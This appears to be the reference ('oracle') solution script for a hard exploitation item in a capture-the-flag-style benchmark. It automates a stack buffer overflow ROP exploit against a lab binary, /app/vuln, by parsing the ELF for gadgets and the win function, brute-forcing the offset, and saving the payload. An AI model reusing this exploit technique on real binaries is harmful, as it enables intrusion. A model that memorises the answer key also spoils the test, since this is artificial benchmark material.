#!/bin/bash
set -euo pipefail

# Oracle solution for item-075-hard.
# Discovers win + both gadgets + the stack offset from the real /app/vuln,
# builds the ROP payload [pop rdi; ret][0xC0FFEE11][ret][win], tests a few
# plausible offsets against the exact binary, and verifies the flag.

python3 - <<'PYEOF'
import os
import re
import struct
import subprocess

VULN = "/app/vuln"
FLAG = "/app/flag.txt"
EXPECT = "PWNED_HARD_075"
MAGIC = 0xC0FFEE11


def symbol_addr(name):
    t = subprocess.run(["objdump", "-t", VULN], capture_output=True, text=True).stdout
    for line in t.splitlines():
        parts = line.split()
        if len(parts) >= 2 and parts[-1] == name:
            try:
                return int(parts[0], 16)
            except ValueError:
                continue
    raise SystemExit(f"symbol {name} not found")


def frame_imm():
    d = subprocess.run(["objdump", "-d", VULN], capture_output=True, text=True).stdout
    m = re.search(r"<capture>:(.*?)(?=\n\n|\Z)", d, re.S)
    body = m.group(1) if m else d
    for line in body.splitlines():
        mm = re.search(r"sub\s+\$0x([0-9a-f]+),\s*%rsp", line)
        if mm:
            return int(mm.group(1), 16)
    raise SystemExit("capture frame size not found")


def text_bytes():
    data = open(VULN, "rb").read()
    assert data[:4] == b"\x7fELF" and data[4] == 2, "not ELF64"
    shoff = struct.unpack_from("<Q", data, 0x28)[0]
    shentsize = struct.unpack_from("<H", data, 0x3A)[0]
    shnum = struct.unpack_from("<H", data, 0x3C)[0]
    shstr = struct.unpack_from("<H", data, 0x3E)[0]
    secs = []
    for i in range(shnum):
        off = shoff + i * shentsize
        name = struct.unpack_from("<I", data, off)[0]
        addr = struct.unpack_from("<Q", data, off + 0x10)[0]
        o = struct.unpack_from("<Q", data, off + 0x18)[0]
        size = struct.unpack_from("<Q", data, off + 0x20)[0]
        secs.append((name, addr, o, size))
    # shstr is the section-header INDEX of the section-name string table;
    # its file offset is the 'o' field of that section header.
    _, _, so, _ = secs[shstr]
    for name, addr, o, size in secs:
        end = data.index(b"\x00", so + name)
        nm = data[so + name:end].decode('utf-8', 'replace')
        if nm == ".text":
            return data[o:o + size], addr
    raise SystemExit(".text not found")


def gadgets():
    blob, base = text_bytes()
    pop_rdi = None
    for i in range(len(blob) - 1):
        if blob[i] == 0x5F and blob[i + 1] == 0xC3:
            pop_rdi = base + i
            break
    ret = None
    for i, b in enumerate(blob):
        if b == 0xC3 and (i == 0 or blob[i - 1] != 0x5F):
            ret = base + i
            break
    if pop_rdi is None or ret is None:
        raise SystemExit("gadgets not found")
    return pop_rdi, ret


def run_payload(chain, off):
    payload = b"A" * off + chain
    with open("/tmp/p.bin", "wb") as f:
        f.write(payload)
    if os.path.exists(FLAG):
        os.remove(FLAG)
    with open("/tmp/p.bin", "rb") as fi:
        subprocess.run([VULN], stdin=fi, stdout=subprocess.DEVNULL,
                       stderr=subprocess.DEVNULL)
    if os.path.exists(FLAG):
        return open(FLAG).read().strip()
    return None


def main():
    win = symbol_addr("win")
    imm = frame_imm()
    pop_rdi, ret = gadgets()
    print(f"win={win:#x} imm={imm:#x} pop_rdi_ret={pop_rdi:#x} ret={ret:#x}")

    chain = (struct.pack("<Q", pop_rdi)
             + struct.pack("<Q", MAGIC)
             + struct.pack("<Q", ret)
             + struct.pack("<Q", win))
    cands = [imm + 8, imm, imm + 16, imm + 24, imm + 32, imm + 40, imm - 8, imm - 16]
    got = None
    for off in cands:
        got = run_payload(chain, off)
        if got == EXPECT:
            print("exploit succeeded at offset", off)
            break
    if got != EXPECT:
        raise SystemExit("oracle could not produce the flag")
    print("flag content OK:", got)
    # Deliverable: persist the winning payload for the verifier.
    with open("/app/payload.bin", "wb") as f:
        f.write(b"A" * off + chain)


if __name__ == "__main__":
    main()
PYEOF

echo "oracle solve complete"